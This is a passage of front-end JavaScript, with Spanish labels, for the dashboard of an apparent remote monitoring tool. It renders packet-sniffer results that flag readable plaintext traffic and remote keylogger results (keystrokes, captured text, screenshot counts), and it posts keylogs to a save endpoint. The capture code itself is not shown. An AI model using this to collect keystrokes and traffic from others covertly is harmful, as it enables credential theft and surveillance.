                        keyRemoteBtn.disabled = false;
                        keyRemoteSpinner.classList.remove('active');
                        keyRemoteBtn.querySelector('.btn-text').textContent = '⏳ ESPERAR AGENTE REMOTO';
                    }
                } catch (_) { /* seguir esperando */ }
            }, POLL_INTERVAL_MS);
        });
    }

    // ================================================================
    //  SHARED RENDER HELPERS (called by polling above)
    // ================================================================

    // Minimal standalone renderers (no dependency on the main closure)
    window._remoteSniffRender = function (data, container) {
        const resultsBody = document.getElementById('sniff-results-body');
        const resultsInfo = document.getElementById('sniff-results-info');
        if (!resultsBody) return;

        resultsInfo.textContent = `Filtro: ${data.filter} | Total capturados: ${data.total_captured} [REMOTO]`;

        if (data.stats) {
            const s = data.stats;
            document.getElementById('stat-insecure').textContent = s.insecure;
            document.getElementById('stat-secure').textContent = s.secure;
            document.getElementById('stat-total').textContent = s.total;
            document.getElementById('stat-plaintext').textContent = s.plaintext_detected;
        }

        resultsBody.innerHTML = '';
        if (!data.packets || data.packets.length === 0) {
            resultsBody.innerHTML = `<tr><td colspan="8" class="no-results"><span class="no-results__icon">📭</span>Esperando paquetes del agente...</td></tr>`;
        } else {
            data.packets.forEach((pkt, i) => {
                const src = pkt.src_ip ? `${pkt.src_ip}:${pkt.src_port}` : '-';
                const dst = pkt.dst_ip ? `${pkt.dst_ip}:${pkt.dst_port}` : '-';
                const secClass = pkt.security === 'insecure' ? 'security-insecure' : pkt.security === 'secure' ? 'security-secure' : 'security-unknown';
                const secLabel = pkt.security === 'insecure' ? '⚠️ NO SEGURO' : pkt.security === 'secure' ? '🔒 CIFRADO' : '—';
                const riskClass = { 'CRÍTICO': 'risk-critical', 'ALTO': 'risk-high', 'MEDIO': 'risk-medium', 'BAJO': 'risk-low', 'NINGUNO': 'risk-none' }[pkt.risk] || 'risk-unknown';
                const proto = pkt.protocol || '?';
                const protoClass = { 'TCP': 'protocol-tcp', 'UDP': 'protocol-udp', 'ICMP': 'protocol-icmp' }[proto] || 'protocol-other';

                let dataCell = pkt.data_readable && pkt.data
                    ? `<span class="data-plaintext">👁️ ${escHtml(pkt.data.substring(0, 40))}${pkt.data.length > 40 ? '...' : ''}</span>`
                    : pkt.data && pkt.data.includes('Cifrado') ? `<span class="data-encrypted">🔒 Cifrado</span>` : `<span class="data-none">—</span>`;

                resultsBody.innerHTML += `
                    <tr class="row-${pkt.security || 'unknown'}">
                        <td class="port-number">${i + 1}</td>
                        <td><span class="protocol-badge ${protoClass}">${proto}</span></td>
                        <td>${escHtml(src)}</td>
                        <td>${escHtml(dst)}</td>
                        <td>${escHtml(pkt.service || '-')}</td>
                        <td><span class="security-badge ${secClass}">${secLabel}</span></td>
                        <td><span class="risk-badge ${riskClass}">${pkt.risk || '-'}</span></td>
                        <td>${dataCell}</td>
                    </tr>`;
            });
        }
        container.classList.add('visible');
    };

    window._remoteKeyRender = function (data, container) {
        const resultsBody = document.getElementById('key-results-body');
        const resultsInfo = document.getElementById('key-results-info');
        const capturedTextBox = document.getElementById('key-captured-text');
        if (!resultsBody) return;

        if (data.stats) {
            document.getElementById('key-stat-total').textContent = data.stats.total;
            document.getElementById('key-stat-letters').textContent = data.stats.letters;
            document.getElementById('key-stat-numbers').textContent = data.stats.numbers;
            document.getElementById('key-stat-special').textContent = data.stats.special;
        }

        // Screenshot stat
        const totalScr = (data.screenshots || []).length;
        const scrStatEl = document.getElementById('key-stat-screenshots');
        if (scrStatEl) scrStatEl.textContent = totalScr;

        capturedTextBox.textContent = data.captured_text || '';
        resultsInfo.textContent = `Duración: ${data.duration}s | Total: ${data.total_keys} teclas [REMOTO]`;
        resultsBody.innerHTML = '';

        if (!data.keys || data.keys.length === 0) {
            resultsBody.innerHTML = `<tr><td colspan="5" class="no-results"><span class="no-results__icon">⌨️</span>Esperando teclas del agente...</td></tr>`;
        } else {
            const typeClassMap = { 'letra': 'key-type-letra', 'número': 'key-type-numero', 'símbolo': 'key-type-simbolo', 'modificador': 'key-type-modificador' };
            data.keys.forEach((key, i) => {
                const time = key.timestamp ? key.timestamp.split(' ')[1] : '-';
                const tc = typeClassMap[key.type] || 'key-type-especial';
                resultsBody.innerHTML += `
                    <tr>
                        <td class="port-number">${i + 1}</td>
                        <td>${time}</td>
                        <td><span class="key-name">${escHtml(key.key)}</span></td>
                        <td>${key.key_code}</td>
                        <td><span class="key-type-badge ${tc}">${key.type}</span></td>
                    </tr>`;
            });
        }
        container.classList.add('visible');
    };

    // ================================================================
    //  REMOTE SAVE — save-keylog-btn unified for local + remote data
    // ================================================================
    document.addEventListener('DOMContentLoaded', () => {
        const saveKeylogBtn = document.getElementById('save-keylog-btn');
        if (!saveKeylogBtn) return;

        const newBtn = saveKeylogBtn.cloneNode(true);
        saveKeylogBtn.parentNode.replaceChild(newBtn, saveKeylogBtn);

        newBtn.addEventListener('click', async () => {
            const keyMessage = document.getElementById('key-message');
            const filepath = document.getElementById('key-filepath').value.trim();

            if (!filepath) {
                showMsg(keyMessage, 'error', '⚠️ Ingresa la ruta donde guardar el archivo.');
                return;
            }

            const keys = window._remoteCapturedKeys && window._remoteCapturedKeys.length > 0
                ? window._remoteCapturedKeys
                : window._localCapturedKeys || [];

            const screenshots = window._remoteCapturedKeys && window._remoteCapturedKeys.length > 0
                ? (window._remoteCapturedScreenshots || [])
                : (window._localCapturedScreenshots || []);

            const capturedText = window._remoteCapturedKeys && window._remoteCapturedKeys.length > 0
                ? (window._remoteCapturedText || '')
                : (window._localCapturedText || '');

            if (keys.length === 0) {
                showMsg(keyMessage, 'error', '⚠️ No hay teclas capturadas para guardar.');
                return;
            }

            newBtn.disabled = true;
            newBtn.textContent = '⏳ GUARDANDO...';

            try {
                const response = await fetch('/save-keylog', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ filepath, keys, captured_text: capturedText, screenshots })
                });

                const data = await response.json();

                if (data.success) {
                    const scr = data.screenshots_saved ? ` | ${data.screenshots_saved} capturas guardadas` : '';
                    showMsg(keyMessage, 'success', `✅ Registro guardado en: ${data.filepath} (${data.total_saved} teclas${scr})`);
                } else {
                    showMsg(keyMessage, 'error', `❌ ${data.error}`);
                }
            } catch (error) {
                showMsg(keyMessage, 'error', `❌ Error: ${error.message}`);
            } finally {
                newBtn.disabled = false;
                newBtn.textContent = '💾 GUARDAR REGISTRO';
            }
        });

        function showMsg(el, type, text) {
            if (!el) return;
            const typeClass = type === 'error' ? 'error' : type === 'info' ? 'info' : type === 'success' ? 'success' : 'warning';
            el.className = `message message--${typeClass} visible`;
            el.innerHTML = text;
        }
    });

    function showAgentBadge(messageEl, type, text) {
        if (!messageEl) return;
        const cls = { waiting: 'message--warning', connected: 'message--success', complete: 'message--info' }[type] || 'message--info';
        messageEl.className = `message ${cls} visible`;
        messageEl.innerHTML = text;
    }

    function escHtml(str) {
        const d = document.createElement('div');
        d.textContent = String(str);
        return d.innerHTML;
    }
})();